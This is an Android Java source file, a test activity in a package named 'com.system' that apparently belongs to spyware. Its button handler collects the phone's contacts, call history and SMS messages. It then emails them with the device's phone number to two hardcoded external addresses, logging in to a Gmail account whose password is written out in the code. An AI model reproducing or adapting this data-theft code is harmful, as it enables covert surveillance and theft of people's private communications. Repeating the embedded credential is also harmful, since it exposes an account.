package com.system.test;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import com.system.GetInfoTask;
import com.system.R;
import com.system.utils.ConfigCtrl;
import com.system.utils.DeviceProperty;
import com.system.utils.SysUtils;

public class TestActivity extends Activity 
{
     Button btn_getinfo;
     Button btn_screenshot;
     OnClickListener listener_getinfo = null;
     OnClickListener listener_screenshot = null;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.test);
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	btn_getinfo = (Button)findViewById(R.id.btn_getinfo);
    	btn_getinfo.setOnClickListener(listener_getinfo);
        btn_screenshot = (Button)findViewById(R.id.btn_screenshot);
        btn_screenshot.setOnClickListener(listener_screenshot);
    }
    
    private void setListener()
    {
    	listener_getinfo = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If network connected, try to collect and send the information
        		if (SysUtils.isNetworkConnected(getApplicationContext()))
        		{
        			GetInfoTask.CollectContact(getApplicationContext());
        			SysUtils.ThreadSleep(100000, "Test");
        			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
        			SysUtils.ThreadSleep(100000, "Test");
        			GetInfoTask.CollectSms(getApplicationContext());
        		
        			// Send mail
        			String subject = Resources.getSystem().getString(R.string.mail_from) 
        	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
        	           		 + " - " + (new String()).toString();
        			String body = String.format(Resources.getSystem().getString(R.string.mail_body), 
        					DeviceProperty.getPhoneNumber(getApplicationContext()));
        			List<String> fileList = new ArrayList<String>();
        			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
        			boolean result = GetInfoTask.sendMail(subject, body, 
        					"richardroky@gmail.com", "yel510641",
        					recipients, fileList);
        			
        			// Update the last date time
        			if (result) ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
        		}
            }
        };
        
        listener_screenshot = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
    }
}